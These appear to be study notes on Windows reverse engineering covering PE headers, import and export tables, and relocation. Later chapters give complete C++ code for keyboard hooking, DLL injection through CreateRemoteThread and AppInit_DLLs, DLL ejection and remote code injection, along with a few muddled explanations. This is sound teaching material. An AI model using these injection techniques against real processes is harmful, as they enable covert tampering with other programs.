9000(VA) + 7C00(PointerToRawData) = 97A8However, RAW address 97A8 is located in the third section. Thus, the given value of RAW by ABA8 is invalid for defining its RAW value. When VirtualSize is larger than SizeOfRawData, the extra region is zero-initialized at load time and does not have a valid file offset. 13.5 - IATDLLBefore studying the Import Address Table (IAT), we need to understand DLLs (Dynamic Link Libraries). In the era of 16-bit DOS, the concept of DLLs did not exist. Instead, applications relied on static libraries, which were linked into the executable at compile time. This approach significantly increased both memory usage and disk space consumption, which was a serious limitation when hardware resources were expensive. To solve this problem, Windows introduced the concept of DLLs: Instead of embedding library code into the executable, applications import DLLs when needed. Code and resources can be shared among multiple applications through memory mapping. Updating a library only requires replacing the corresponding DLL file. There are two primary ways to load DLLs: Explicit Linking:The application loads the DLL at runtime using functions such as LoadLibrary, and resolves function addresses manually using GetProcAddress. The DLL can be unloaded explicitly when it is no longer needed. Implicit Linking:The DLL is loaded automatically by the Windows loader when the application starts, and it remains loaded until the process terminates. These mechanisms are closely related to the Import Address Table (IAT), which plays a critical role during DLL loading and function resolution. Notice that the loader calls the API function CreateFileW() via an indirect call rather than a direct call.The loader obtains the address of the API function from memory address 0x01001104.The loader calls API functions using this method consistently. The reason the loader does not call the API function directly (for example, using the instruction CALL 765233B0) is that the author of notepad.exe did not know in advance which platform the program would run on.This design allows the executable to support multiple platforms and environments. Another reason is DLL relocation.Usually, the default ImageBase of a DLL is 0x10000000.If this address is already occupied by a.dll, then b.dll cannot be loaded at the same ImageBase and must be relocated, for example, to 0x3E000000. In practice, it cannot be guaranteed that a DLL can be loaded at its preferred ImageBase, because the PE header uses RVAs instead of absolute virtual addresses (VAs).In contrast, an executable can usually be loaded at its specified ImageBase because it has its own virtual address space. IMAGE_IMPORT_DESCRIPTOR12345678910111213141516171819202122232425typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; /* 0 for terminating null import descriptor */ DWORD OriginalFirstThunk; /* RVA to original unbound IAT */ &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; /* 0 if not bound, * -1 if bound, and real date\\time stamp * in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT * (new BIND) * otherwise date/time stamp of DLL bound to * (Old BIND) */ DWORD ForwarderChain; /* -1 if no forwarders */ DWORD Name; /* RVA to IAT (if bound this IAT has actual addresses) */ DWORD FirstThunk;&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;/* Import name entry */typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; char Name[1];&#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h The number of imported libraries is equal to the number of IMAGE_IMPORT_DESCRIPTOR Field Meaning OriginalFirstThunk Address of INT (RVA) Name Address of library string name (RVA) FirstThunk Address of IAT (RVA) Load into IAT Obtain the name of the library (for example: “kernel32.dll”) from IID (“IMAGE_IMPORT_DESCRIPTOR”) LoadLibrary(&quot;kernel32.dll) Read OriginalFirstThunk member from IID, and then obtain the addressof INT (Import Name Table). Read the values from the array in INT consecutively. Subsequently, obtain the RVA (Relative Virtual Address) of IMAGE_IMPORT_BY_NAME. PracticeWhere is IMAGE_IMPORT_DESCRIPTOR? It is not located in PE header. Instead, it locates in PE body, but its location is stored in PE header. The value of IMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress is the AddressOfEntryPoint (RVA value). IMAGE_IMPORT_DESCRIPTOR is also know as IMAGE_DIRECTORY_TABLE. Name (Library Name) OriginalFirstThunk——INT IMAGE_IMPORT_BY_NAME FirstThunk——IAT (Import Address Table) 13.6 - EATThe value of IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress is the RVA value of IMAGE_EXPORT_DIRECTORY 123456789101112131415typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; //creation time date stamp WORD MajorVersion; WORD MinorVersion; DWORD Name; //address of library file name DWORD Base; //ordinal base DWORD NumberOfFunctions; //number of functions DWORD NumberOfNames; //number of names DWORD AddressOfFunctions; //address of function start address array DWORD AddressOfNames; //address of function name string array DWORD AddressOfNameOrdinals; //address of ordinal array&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h Important fields:| Field | Meaning || —- | —- || NumberOfFunctions | The total number of exported functions| NumberOfNames || AddressOfFunctions || AddressOfNames || AddressOfNameOrdinals | Source: https://baebenzene.tistory.com/5 A PE file obtains the function address from libraries via an API——GetProcAddress() Chapter 16 - Base Relocation Table16.1 - PE RelocationMicrosoft introduced ASLR technique since Windows Vista. This technique can improve security of Windows systems. 16.2 - The Operations of PE Relocation16.3 - The Principles of PE Relocation123456typedef struct _IMAGE_BASE_RELOCATION&#123; DWORD VirtualAddress; DWORD SizeOfBlock; /* WORD TypeOffset[1]; */&#125; IMAGE_BASE_RELOCATION,*PIMAGE_BASE_RELOCATION; Chapter 17 - Remove .reloc Section from ExecutableChapter 18 - Analyzing UPackPE HeaderChapter 19 - UPackPE Debugging - Find the OEPChapter 20 - PatchingChapter 21 - Windows Message Hooking21.2 - Message Hooking 21.3 - SetWindowsHookEx()123456HHOOK SetWindowsHookExW( [in] int idHook, [in] HOOKPROC lpfn, [in] HINSTANCE hmod, [in] DWORD dwThreadId); 21.4 - Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Source: https://github.com/reversecore/book//HookMain.cpp#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot;#define DEF_HOOKSTART &quot;HookStart&quot;#define DEF_HOOKSTOP &quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; //Load KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; //Obtain the export functions&#x27; addresses. HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); //Start hooking. HookStart(); //Wait until user enters &#x27;q&#x27; printf(&quot;press &#x27;q&#x27; to quit!\\n&quot;); while( _getch() != &#x27;q&#x27; ) ; //Stop hooking. HookStop(); //Unload KeyHook.dll FreeLibrary(hDll);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//KeyHook.cpp#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch( dwReason ) &#123; case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#x27;\\\\&#x27;); //Compare to current process. Message will not be passed to the next hook if the current process is notepad.exe. if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; //If it is not notepad.exe, then the message will be passed to the next hook via calling CallNextHookEx() return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;//Export functions.#ifdef __cplusplusextern &quot;C&quot; &#123;#endif __declspec(dllexport) void HookStart() &#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); &#125; __declspec(dllexport) void HookStop() &#123; if( g_hHook ) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125; &#125;#ifdef __cplusplus&#125;#endif 12345LRRESULT CALLBACK KeyboardProc( int code, //HC_ACTION(0), HC_NOREMOVE(3) WPARAM wParam, //virtual-key code LPARAM lParam //extra information); Chapter 23 - DLL Injection123456789101112131415161718BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch(dwReason) &#123; case DLL_PROCESS_ATTACH: break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125;&#125; 23.1 - Implementation of DLL InjectionUsually, there are three methods to implement DLL injection: Create remote thread via CreateRemoteThread() API Using registry with modifying the value of AppInit_DLLs SetWindowsHookEx() API CreateRemoteThread()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//myhack.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;urlmon.lib&quot;)#define DEF_URL (L&quot;http://www.naver.com/index.html&quot;)#define DEF_FILE_NAME (L&quot;index.html&quot;)HMODULE g_hMod = NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123; TCHAR szPath[_MAX_PATH] = &#123;0,&#125;; if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) ) return FALSE; TCHAR *p = _tcsrchr( szPath, &#x27;\\\\&#x27; ); if( !p ) return FALSE; _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME); URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL); return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; HANDLE hThread = NULL; g_hMod = (HMODULE)hinstDLL; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); CloseHandle(hThread); break; &#125; return TRUE;&#125; Once the DLL is loaded, it prints &quot;myhack.dll Injection!!!&quot;. It then calls the function by creating a thread (ThreadProc). ThreadProc downloads the specified HTML document with the API urlmon!URLDownloadToFile() and saves it as index.html. Notice that once the DLL file is loaded, DllMain will be called automatically. Hence, once the DLL file above is loaded, the function ThreadProc() will eventually be executed. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//InjectDll.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123; TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123; HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // #1. Obtain the Handle of notepad.exe via dwPID. if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; // #2. Allocate virtual memory in the address space of notepad.exe. // The size of the allocated memory is based on szDllPath.The size virtual memory space is the size of szDllName pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); // #3. Write the path of myhack.dll (szDllName) into the allocated memory space. WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); // #4. Obtain the address of LoadLibraryA() API. hMod = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;); // #5. Create a remote thread in notepad.exe. hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125;int _tmain(int argc, TCHAR *argv[])&#123; if( argc != 3) &#123; _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\\n&quot;, argv[0]); return 1; &#125; // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // inject dll if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) ) _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) success!!!\\n&quot;, argv[2]); else _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) failed!!!\\n&quot;, argv[2]); return 0;&#125; CreateRemoteThread is used to create a thread in a remote process.In DLL injection, it is commonly used to make the remote process call LoadLibraryW() so that the DLL is loaded into that process. 123456789HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId); AppInit_DLLsThe principle of this method is that user32.dll automatically loads the DLLs specified in the AppInit_DLLs registry value whenever user32.dll is loaded into a process. To enable this feature, you need to set LoadAppInit_DLLs to 1 and restart the system. Warning: This method is powerful because it allows a DLL to be loaded into all processes that load user32.dll. You must be careful with your DLL code; otherwise, your system may become unstable. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// myhack2.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define DEF_CMD L&quot;c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe&quot; #define DEF_ADDR L&quot;http://www.naver.com&quot;#define DEF_DST_PROC L&quot;notepad.exe&quot;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; TCHAR szCmd[MAX_PATH] = &#123;0,&#125;; TCHAR szPath[MAX_PATH] = &#123;0,&#125;; TCHAR *p = NULL; STARTUPINFO si = &#123;0,&#125;; PROCESS_INFORMATION pi = &#123;0,&#125;; si.cb = sizeof(STARTUPINFO); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : if( !GetModuleFileName( NULL, szPath, MAX_PATH ) ) break; if( !(p = _tcsrchr(szPath, &#x27;\\\\&#x27;)) ) break; if( _tcsicmp(p+1, DEF_DST_PROC) ) break; wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR); if( !CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi) ) break; if( pi.hProcess != NULL ) CloseHandle(pi.hProcess); break; &#125; return TRUE;&#125; 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows SetWindowsHookEx()Chapter 24 - DLL EjectionThis technique is similar to DLL injection. Instead of using LoadLibrary() to load a DLL, we use FreeLibrary() to unload a DLL via CreateRemoteThread(). Every Windows kernel object has a reference count, which indicates how many references to the object currently exist. For example, the reference count of a.dll becomes 10 if LoadLibrary(&quot;a.dll&quot;) is called 10 times. Accordingly, FreeLibrary() must be called 10 times to fully unload a.dll. The reference count is decreased by 1 whenever FreeLibrary() is called. Therefore, we need to pay attention to the value of the reference count. Chapter 25 - Load DLL File by Modifying the PE File123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161// EjectDll.exe#include &quot;windows.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;#define DEF_PROC_NAME (L&quot;notepad.exe&quot;)#define DEF_DLL_NAME (L&quot;myhack.dll&quot;)DWORD FindProcessID(LPCTSTR szProcessName)&#123; DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do &#123; if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123; dwPID = pe.th32ProcessID; break; &#125; &#125; while(Process32Next(hSnapShot, &amp;pe)); CloseHandle(hSnapShot); return dwPID;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123; TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad 프로세스 ID // TH32CS_SNAPMODULE 파라미터를 이용해서 notepad 프로세스에 로딩된 DLL 이름을 얻음 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, &amp;me); for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) ) &#123; if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) &#123; bFound = TRUE; break; &#125; &#125; if( !bFound ) &#123; CloseHandle(hSnapshot); return FALSE; &#125; if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; hModule = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123; DWORD dwPID = 0xFFFFFFFF; // find process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) &#123; _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME); return 1; &#125; _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID); // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // eject dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME); else _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME); return 0;&#125; 123456789101112typedef struct tagMODULEENTRY32 &#123; DWORD dwSize; DWORD th32ModuleID; DWORD th32ProcessID; DWORD GlblcntUsage; DWORD ProccntUsage; BYTE *modBaseAddr; DWORD modBaseSize; HMODULE hModule; char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32; Chapter 26 - PE ToolsChapter 27 - Code Injection27.4 - CodeInjection.cppMsgBox()12345678910111213141516171819202122//MsgBox.cpp#include &quot;windows.h&quot;DWORD WINAPI ThreadProc(LPVOID lParam)&#123; MessageBoxA(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK); return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); break; &#125; return TRUE;&#125;main()1234567891011121314151617181920int main(int argc, char *argv[])&#123; DWORD dwPID = 0; if( argc != 2 ) &#123; printf(&quot;\\n USAGE : %s &lt;pid&gt;\\n&quot;, argv[0]); return 1; &#125; // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // code injection dwPID = (DWORD)atol(argv[1]); InjectCode(dwPID); return 0;&#125;ThreadProc()12345678910111213141516171819202122232425262728293031323334353637383940414243444546typedef struct _THREAD_PARAM &#123; FARPROC pFunc[2]; // LoadLibraryA(), GetProcAddress() char szBuf[4][128]; // &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;&#125; THREAD_PARAM, *PTHREAD_PARAM;typedef HMODULE (WINAPI *PFLOADLIBRARYA)( LPCSTR lpLibFileName);typedef FARPROC (WINAPI *PFGETPROCADDRESS)( HMODULE hModule, LPCSTR lpProcName);typedef int (WINAPI *PFMESSAGEBOXA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);DWORD WINAPI ThreadProc(LPVOID lParam)&#123; PTHREAD_PARAM pParam = (PTHREAD_PARAM)lParam; HMODULE hMod = NULL; FARPROC pFunc = NULL; // LoadLibrary() hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]); // &quot;user32.dll&quot; if( !hMod ) return 1; // GetProcAddress() pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]); // &quot;MessageBoxA&quot; if( !pFunc ) return 1; // MessageBoxA() ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK); return 0;&#125;InjectCode()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141BOOL InjectCode(DWORD dwPID)&#123; HMODULE hMod = NULL; THREAD_PARAM param = &#123;0,&#125;; HANDLE hProcess = NULL; HANDLE hThread = NULL; LPVOID pRemoteBuf[2] = &#123;0,&#125;; DWORD dwSize = 0; hMod = GetModuleHandleA(&quot;kernel32.dll&quot;); // set THREAD_PARAM param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;); strcpy_s(param.szBuf[0], &quot;user32.dll&quot;); strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;); strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;); strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;); // Open Process if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, // dwDesiredAccess FALSE, // bInheritHandle dwPID)) ) // dwProcessId &#123; printf(&quot;OpenProcess() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for THREAD_PARAM dwSize = sizeof(THREAD_PARAM); if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[0], // lpBaseAddress (LPVOID)&amp;param, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for ThreadProc() dwSize = (DWORD)InjectCode - (DWORD)ThreadProc; if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_EXECUTE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[1], // lpBaseAddress (LPVOID)ThreadProc, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; if( !(hThread = CreateRemoteThread(hProcess, // hProcess NULL, // lpThreadAttributes 0, // dwStackSize (LPTHREAD_START_ROUTINE)pRemoteBuf[1], // dwStackSize pRemoteBuf[0], // lpParameter 0, // dwCreationFlags NULL)) ) // lpThreadId &#123; printf(&quot;CreateRemoteThread() fail : err_code = %d\\n&quot;, GetLastError()); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123; TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; printf(&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE;&#125; Chapter 28 - Code Injection via Assembly Code Chapter 29 - API Hooking Source: https://maple19out.tistory.com/45 Chapter 30 - API Hooking of Notepad.exe WriteFile()Debug Events EXCEPTION_DEBUG_EVENT CREATE_THREAD_DEBUG_EVENT CREATE_PROCESS_DEBUG_EVENT EXIT_THREAD_DEBUG_EVENT EXIT_PROCESS_DEBUG_EVENT LOAD_DLL_DEBUG_EVENT UNLOAD_DLL_DEBUG_EVENT OUTPUT_DEBUT_STRING_EVENT RIP_EVENT EXCEPTION_DEBUG_EVENT EXCEPTION_ACCESS_VIOLATION EXCEPTION_ARRAY_BOUNDS_EXCEEDED EXCEPTION_BREAKPOINT EXCEPTION_DATATYPE_MISALIGNMENT EXCEPTION_FLT_DENORMAL_OPERAND EXCEPTION_FLT_DIVIDE_BY_ZERO EXCEPTION_FLT_INEXACT_RESULT EXCEPTION_FLT_INVALID_OPERATION EXCEPTION_FLT_OVERFLOW EXCEPTION_FLT_STACK_CHECK EXCEPTION_FLT_UNDERFLOW EXCEPTION_FLT_ILLEGAL_INSTRUCTIOIN EXCEPTION_IN_PAGE_ERROR EXCEPTION_INT_DIVIDE_BY_ZERO EXCEPTION_INT_OVERFLOW EXCEPTION_INVALID_DISPOSITION 